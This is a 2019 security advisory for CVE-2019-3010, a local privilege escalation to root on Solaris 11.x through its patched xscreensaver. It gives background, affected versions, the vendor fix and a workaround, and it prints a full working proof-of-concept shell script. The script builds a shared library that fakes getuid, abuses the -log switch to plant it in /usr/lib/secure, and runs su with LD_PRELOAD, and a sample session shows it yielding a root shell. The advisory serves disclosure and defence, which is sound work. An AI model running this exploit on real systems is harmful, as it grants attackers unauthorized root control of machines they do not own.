@@ -1,0 +1,168 @@
+@Mediaservice.net Security Advisory #2019-02 (last updated on 2019-10-16)
+
+         Title:  Local privilege escalation on Solaris 11.x via xscreensaver
+   Application:  Jamie Zawinski's xscreensaver 5.39 distributed with Solaris 11.4
+    Jamie Zawinski's xscreensaver 5.15 distributed with Solaris 11.3
+    Other versions starting from 5.06 are potentially affected
+     Platforms:  Oracle Solaris 11.x (tested on 11.4 and 11.3)
+    Other platforms are potentially affected (see below)
+   Description:  A local attacker can gain root privileges by exploiting a
+    design error vulnerability in the xscreensaver distributed with
+    Solaris
+        Author:  Marco Ivaldi <marco.ivaldi@mediaservice.net>
+ Vendor Status:  <secalert_us@oracle.com> notified on 2019-07-09
+      CVE Name:  CVE-2019-3010
+   CVSS Vector:  CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (Base Score: 8.8)
+    References: https://lab.mediaservice.net/advisory/2019-02-solaris-xscreensaver.txt
+    https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html
+    https://www.jwz.org/xscreensaver/
+    https://www.oracle.com/technetwork/server-storage/solaris11/
+    https://www.mediaservice.net/
+    https://0xdeadbeef.info/
+
+1. Abstract.
+
+Exploitation of a design error vulnerability in xscreensaver, as distributed
+with Solaris 11.x, allows local attackers to create (or append to) arbitrary
+files on the system, by abusing the -log command line switch introduced in
+version 5.06. This flaw can be leveraged to cause a denial of service condition
+or to escalate privileges to root.
+
+2. Example Attack Session.
+
+raptor@stalker:~$ cat /etc/release
+                             Oracle Solaris 11.4 X86
+  Copyright (c) 1983, 2018, Oracle and/or its affiliates.  All rights reserved.
+                            Assembled 16 August 2018
+raptor@stalker:~$ uname -a
+SunOS stalker 5.11 11.4.0.15.0 i86pc i386 i86pc
+raptor@stalker:~$ id
+uid=100(raptor) gid=10(staff)
+raptor@stalker:~$ chmod +x raptor_xscreensaver
+raptor@stalker:~$ ./raptor_xscreensaver
+raptor_xscreensaver - Solaris 11.x LPE via xscreensaver
+Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+[...]
+Oracle Corporation      SunOS 5.11      11.4    Aug 2018
+root@stalker:~# id
+uid=0(root) gid=0(root)
+
+3. Affected Platforms.
+
+This vulnerability was confirmed on the following platforms:
+
+* Oracle Solaris 11.x X86 [tested on 11.4 and 11.3, default installation]
+* Oracle Solaris 11.x SPARC [untested]
+
+Previous Oracle Solaris 11 versions might also be vulnerable.
+
+Based on our analysis and on feedback kindly provided by Alan Coopersmith of
+Oracle, we concluded that this is a Solaris-specific vulnerability, caused by
+the fact that Oracle maintains a slightly different codebase from the upstream
+one. Alan explained this as follows:
+
+"The problem in question here appears to be inherited from the long-ago fork
+[originally based on xscreensaver 4.05] Sun & Ximian did to add a gtk-based
+unlock dialog with accessibility support to replace the non-accessible Xlib
+unlock dialog that upstream provides, which moves the uid reset to after where
+the log file opening was later added."
+
+Specifically, the problem arises because of this bit of Solaris patches:
+https://github.com/oracle/solaris-userland/blob/18c7129a50c0d736cbac04dcfbfa1502eab71e33/components/desktop/xscreensaver/patches/0005-gtk-lock.patch#L3749-L3770
+
+As an interesting side note, it appears Red Hat dropped this code back in 2002
+with version 4.05-5:
+https://src.fedoraproject.org/rpms/xscreensaver/blob/9a0bab5a19b03db9671fc5a20714755445f19e21/f/xscreensaver.spec#L2178-2179
+
+4. Fix.
+
+Oracle has assigned the tracking# S1182608 and has released a fix for all
+affected and supported versions of Solaris in their Critical Patch Update (CPU)
+of October 2019.
+
+As a temporary workaround, it is also possible to remove the setuid bit from
+the xscreensaver executable as follows (note that this might prevent it from
+working properly):
+
+bash-3.2# chmod -s /usr/bin/xscreensaver
+
+5. Proof of Concept.
+
+An exploit for Oracle Solaris 11.x has been developed as a proof of concept. It
+can be downloaded from:
+
+https://github.com/0xdea/exploits/blob/master/solaris/raptor_xscreensaver
+
+#!/bin/sh
+
+#
+# raptor_xscreensaver - Solaris 11.x LPE via xscreensaver
+# Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+#
+# Exploitation of a design error vulnerability in xscreensaver, as 
+# distributed with Solaris 11.x, allows local attackers to create
+# (or append to) arbitrary files on the system, by abusing the -log
+# command line switch introduced in version 5.06. This flaw can be
+# leveraged to cause a denial of service condition or to escalate
+# privileges to root. This is a Solaris-specific vulnerability,
+# caused by the fact that Oracle maintains a slightly different
+# codebase from the upstream one (CVE-2019-3010).
+#
+# "I'd rather be lucky than good any day." -- J. R. "Bob" Dobbs
+# "Good hackers force luck." -- ~A.
+#
+# This exploit targets the /usr/lib/secure/ directory in order
+# to escalate privileges with the LD_PRELOAD technique. The
+# implementation of other exploitation vectors, including those
+# that do not require gcc to be present on the target system, is
+# left as an exercise to fellow UNIX hackers;)
+#
+# Usage:
+# raptor@stalker:~$ chmod +x raptor_xscreensaver
+# raptor@stalker:~$ ./raptor_xscreensaver
+# [...]
+# Oracle Corporation      SunOS 5.11      11.4    Aug 2018
+# root@stalker:~# id
+# uid=0(root) gid=0(root)
+# root@stalker:~# rm /usr/lib/secure/64/getuid.so /tmp/getuid.*
+#
+# Vulnerable platforms:
+# Oracle Solaris 11 X86 [tested on 11.4 and 11.3]
+# Oracle Solaris 11 SPARC [untested]
+#
+
+echo "raptor_xscreensaver - Solaris 11.x LPE via xscreensaver"
+echo "Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>"
+echo
+
+# prepare the payload
+echo "int getuid(){return 0;}" > /tmp/getuid.c
+gcc -fPIC -Wall -g -O2 -shared -o /tmp/getuid.so /tmp/getuid.c -lc
+if [ $? -ne 0 ]; then
+echo "error: problem compiling the shared library, check your gcc"
+exit 1
+fi
+
+# check the architecture
+LOG=/usr/lib/secure/getuid.so
+file /bin/su | grep 64-bit >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+LOG=/usr/lib/secure/64/getuid.so
+fi
+
+# start our own xserver
+# alternatively we can connect back to a valid xserver (e.g. xquartz)
+/usr/bin/Xorg :1 &
+
+# trigger the bug
+umask 0
+/usr/bin/xscreensaver -display :1 -log $LOG &
+sleep 5
+
+# clean up
+pkill -n xscreensaver
+pkill -n Xorg
+
+# LD_PRELOAD-fu
+cp /tmp/getuid.so $LOG
+LD_PRELOAD=$LOG su -
